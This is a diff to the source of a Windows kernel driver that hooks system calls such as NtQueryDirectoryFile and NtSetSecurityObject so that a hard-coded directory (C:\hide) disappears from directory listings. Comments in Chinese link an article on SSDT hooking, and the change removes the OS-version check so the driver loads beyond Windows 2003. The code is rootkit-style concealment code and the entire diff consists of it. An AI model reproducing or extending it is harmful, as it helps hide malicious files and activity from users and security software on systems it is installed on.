@@ -234,7 +234,7 @@ HOOK_CONTEXT g_hook_table[] = {
 	{L"NtSetSecurityObject",NULL,NULL,(void *)HOOK_NtSetSecurityObject}, //4
 };
 
-WCHAR g_HideDir[512] = L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+WCHAR g_HideDir[512] = L"C:\\hide\0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
 enum _XXXXXXXXXXXXXX
 {
@@ -1145,6 +1145,9 @@ NTSTATUS HOOK_NtQueryDirectoryFile(IN HANDLE FileHandle,
             RestartScan);
         if(STATUS_SUCCESS == status)
         {
+			//发现 windows 7 上还可能使整个 FileIdBothDirectoryInformation
+			//发现遗失的还有很多字段　　具体可以参考这篇文章
+			// http://www.sevagas.com/?Hide-files-using-SSDT-hooking
 			if (FileBothDirectoryInformation == FileInformationClass)
 			{
 				FILE_BOTH_DIR_INFORMATION* pPrev = NULL;
@@ -1281,6 +1284,7 @@ NTSTATUS  HOOK_NtSetSecurityObject(IN HANDLE Handle,
 		SecurityDescriptor);
 }
 
+
 /////////////////////////////////////////////////////////////
 NTSTATUS DriverEntry(
     __in PDRIVER_OBJECT DriverObject,
@@ -1291,17 +1295,19 @@ NTSTATUS DriverEntry(
     UNREFERENCED_PARAMETER(DriverObject);
 	UNREFERENCED_PARAMETER(RegistryPath);
 
+
     if(STATUS_SUCCESS != RtlGetVersion(&vi))
     {
         dbg_msg("get os ver error ~!");
         return STATUS_UNSUCCESSFUL;
     }
+	/*
     if (3790 != vi.dwBuildNumber)
     {
         dbg_msg("os is not win2003 ~!");
         return STATUS_UNSUCCESSFUL;
     }
-
+	*/
 	if(IsSafeBootMode())
 	{
 		dbg_msg("i reject be loaded in safe mode ");
